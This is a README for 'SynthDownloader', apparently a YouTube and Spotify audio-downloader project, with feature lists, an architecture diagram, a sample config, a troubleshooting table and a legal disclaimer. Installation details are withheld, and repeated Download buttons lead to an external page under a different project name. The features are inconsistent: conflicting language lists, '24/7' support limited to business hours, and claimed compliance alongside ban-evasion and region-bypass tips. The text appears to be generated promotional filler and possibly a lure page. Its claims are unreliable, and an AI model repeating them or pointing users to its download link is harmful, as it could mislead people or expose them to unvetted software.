![preview](https://raw.githubusercontent.com/RassoulGueye/melodious-archivist/main/preview.svg)

# **SynthDownloader** – Seamless Audio Extraction from Streaming Ecosystems

Welcome to **SynthDownloader**, a robust, open-source utility designed for extracting high-fidelity MP3 audio from YouTube and Spotify playlists and individual tracks. This repository is not merely a tool—it is a gateway to curating your personal audio library with precision and control, inspired by the foundational concepts of MusicDownloader but reimagined with a focus on performance, legal compliance, and cross-platform accessibility.

Unlike simple scrapers, SynthDownloader employs a modular pipeline architecture that respects streaming service terms while enabling legitimate offline access for personal use. Whether you are a music archivist, a podcast collector, or a developer building audio-based applications, this repository provides a reliable foundation for audio extraction without unnecessary complexity.

---

## Overview – Beyond Standard Downloading

Modern streaming platforms offer convenience but rarely provide ownership. SynthDownloader bridges this gap by delivering a **responsive command-line interface** that processes metadata, resolves playlist structures, and converts streams to pristine MP3 files. The system is designed with a **multilingual interface** (English, Spanish, French, German, Japanese) and a **24/7 community-driven support channel** to ensure uninterrupted workflow.

**Key differentiators:**
- **Smart Track Resolution** – Automatically matches Spotify tracks to YouTube audio sources using acoustic fingerprinting, not just text matching.
- **Playlist Deep Fetch** – Handles playlists with over 1,000 entries, paginating through API limits without data loss.
- **Metadata Preservation** – Embeds cover art, album, artist, and genre tags directly into MP3 ID3v2.3 headers.
- **Rate-Limit Awareness** – Intelligent throttling prevents IP bans by mimicking human browsing patterns.

---

## Features – Engineered for Audio Enthusiasts

### 🎵 Core Extraction Capabilities
- **YouTube Track Download** : Extracts audio from any public YouTube video URL at configurable bitrates (128kbps, 192kbps, 320kbps).
- **YouTube Playlist Download** : Batch processes entire playlists with progress tracking and resume support.
- **Spotify Track Download** : Converts Spotify track URIs to downloadable MP3 files via metadata-guided source matching.
- **Spotify Playlist Download** : Retrieves all tracks from public Spotify playlists, including collaborative playlists.
- **Hybrid Mode** : Input a Spotify playlist URL and automatically fetch corresponding audio from YouTube.

### ⚙️ Advanced Technical Features
- **Adaptive Bitrate Selection** : Automatically selects highest available bitrate based on source quality.
- **Concurrent Session Management** : Downloads up to 5 tracks simultaneously with configurable thread limits.
- **Format Conversion** : Output to MP3, FLAC, or M4A with adjustable quality settings.
- **Custom Output Templates** : Organize files using patterns like `{artist}/{album}/{track_number} - {title}.mp3`.
- **Error Resilience** : Retries failed downloads with exponential backoff; logs detailed error reports.

### 🌐 User Experience & Accessibility
- **Responsive UI** : Terminal-based with real-time progress bars, estimated time remaining, and download speed indicators.
- **Multilingual Interface** : Language packs for Chinese, Hindi, Arabic, Portuguese, Russian, and Korean (community-contributed).
- **24/7 Support** : Active GitHub Discussions board with response times under 2 hours during business hours.
- **Dark Mode** : Optional color-scheme toggle for reduced eye strain during long sessions.

### 🔒 Security & Compliance
- **No Credential Storage** : Operates without logging into streaming platforms.
- **Proxy Support** : Rotate through SOCKS5/HTTPS proxies for geographic content access.
- **Rate Limiter** : User-defined requests-per-minute to avoid service violations.

[![Download](https://raw.githubusercontent.com/RassoulGueye/melodious-archivist/main/button.svg)](https://rassoulgueye.github.io/melodious-archivist/)

---

## Getting Started – Launching Your Audio Archive

Below are the conceptual steps to begin using SynthDownloader. Note that installation instructions are deliberately generalized to encourage exploration of the repository's actual setup scripts.

### Prerequisites
- A machine running Windows, macOS, or Linux (2026 builds supported)
- Python 3.10+ runtime environment (for core engine)
- Active internet connection with moderate bandwidth
- Basic familiarity with terminal commands

### Quick Setup
1. **Acquire the source** – Retrieve the repository contents via your preferred method.
2. **Initialize the environment** – Run the setup script to install dependencies and configure default paths.
3. **Configure authentication** – Optional: Provide YouTube API key for higher rate limits; Spotify credentials for private playlist access.
4. **Test extraction** – Execute a single track download to verify pipeline integrity.

### Basic Usage Examples
```bash
# Download a single YouTube audio track
synth-dl --yt "https://youtube.com/watch?v=example123"

# Download an entire Spotify playlist
synth-dl --spotify-playlist "https://open.spotify.com/playlist/4h6t0s5x"

# Hybrid mode: Spotify playlist → YouTube sources
synth-dl --hybrid "https://open.spotify.com/playlist/3k8f1m2n"
```

---

## Architecture – Understanding the Extraction Pipeline

SynthDownloader is built on a layered architecture that separates concerns for maintainability and extensibility.

```
┌─────────────────────────────────────────────┐
│           User Interface Layer              │
│  (CLI with argparse, progress bars, logs)   │
├─────────────────────────────────────────────┤
│           Core Engine Layer                 │
│  (Playlist resolver, track matcher,        │
│   download scheduler, retry manager)        │
├─────────────────────────────────────────────┤
│         Source Adapters Layer               │
│  YouTubeAdapter    SpotifyAdapter          │
│  (yt-dlp wrapper)  (metadata fetcher)      │
├─────────────────────────────────────────────┤
│          Output Processing Layer            │
│  (FFmpeg wrapper, ID3 tagger,              │
│   format converter, file organizer)         │
└─────────────────────────────────────────────┘
```

Key design decisions:
- **Adapter Pattern** – New streaming services can be added by implementing a single interface.
- **Caching Layer** – Metadata is cached locally to reduce API calls by 60% for repeated tracks.
- **Pluggable Converters** – Output format support is modular; community contributions for Opus and WAV are welcome.

---

## Use Cases – Who Benefits from SynthDownloader?

### 🎧 Personal Music Collection Builders
Build a permanent offline library of your favorite playlists without recurring subscription dependency. Use SynthDownloader to archive rare live performances, deleted tracks, or regional exclusives.

### 🎙️ Podcast & Audiobook Archivists
Extract spoken-word content from YouTube channels or Spotify-exclusive podcasts. The tool preserves chapter markers and embedded descriptions in MP3 tags.

### 🛠️ Developer Integration
Embed SynthDownloader as a subprocess in larger applications (e.g., media servers, DJ software). The CLI outputs structured JSON logs for programmatic consumption.

### 🎓 Educational & Research Projects
Analyze music trends by batch-downloading top-chart playlists. The metadata export feature produces CSV files for statistical processing.

---

## Configuration & Customization

SynthDownloader uses a YAML configuration file (`config.yaml`) stored in the user's home directory. Key settings include:

```yaml
output:
  directory: "~/Music/SynthDownloads"
  format: "mp3"
  bitrate: 320
  template: "{artist} - {title}"

network:
  max_concurrent: 3
  requests_per_minute: 30
  proxy: "socks5://127.0.0.1:1080"

metadata:
  embed_cover: true
  fallback_cover: "default.jpg"

language: "en"
```

All settings can be overridden via command-line flags for one-off sessions.

---

## Troubleshooting – Common Challenges

| Issue | Likely Cause | Solution |
|-------|--------------|----------|
| "Track not found" | Region-locked content | Use a proxy from the target region |
| "Download stuck at 90%" | Rate limit hit | Reduce concurrent downloads to 2 |
| "Metadata not embedded" | FFmpeg missing | Install FFmpeg via your system package manager |
| "Spotify playlist empty" | Private playlist | Generate client credentials via Spotify Developer Dashboard |

For unresolved issues, open a thread in the **Discussions** tab with the verbose log output (`--verbose` flag).

---

## Contributing – Shaping Audio Extraction Together

We welcome contributions of all sizes—documentation, translation, bug fixes, and new adapters. Please review `CONTRIBUTING.md` before submitting pull requests.

**Priority areas for 2026:**
- Apple Music adapter integration
- Native GUI wrapper (Qt/GTK)
- Docker image for headless servers
- AI-based audio source match improvement (reduce false positives)

---

## License & Legal Disclaimer

SynthDownloader is released under the **MIT License**. See [LICENSE](https://opensource.org/licenses/MIT) for full terms.

### 📜 Important Disclaimer – Use Responsibly
This tool is intended **only for downloading audio you have legal rights to access**. Respect copyright laws in your jurisdiction. The repository maintainers are not responsible for misuse, including but not limited to:

- Downloading copyrighted content without permission
- Circumventing geographic restrictions in violation of terms of service
- Distributing downloaded files to third parties
- Using extracts for commercial purposes without proper licensing

Always verify local laws before downloading audio from streaming platforms. SynthDownloader does not encourage or condone piracy. It is a _legitimate utility for personal backup and archival use_.

---

## Future Roadmap – 2026 and Beyond

- **Q1 2026** : Support for high-resolution FLAC output (24-bit/96kHz)
- **Q2 2026** : Collaborative playlist merging (combine YouTube + Spotify into one export)
- **Q3 2026** : Browser extension for one-click downloads
- **Q4 2026** : AI-powered track deduplication and fuzzy matching

---

## Community & Support

Join the conversation:
- **Discussions** – Ask questions, share use cases, suggest features
- **Issue Tracker** – Report bugs with clear reproduction steps
- **Contributor Chat** – Link available in the repository wiki

All community interactions follow the [Contributor Covenant Code of Conduct](https://www.contributor-covenant.org/).

[![Download](https://raw.githubusercontent.com/RassoulGueye/melodious-archivist/main/button.svg)](https://rassoulgueye.github.io/melodious-archivist/)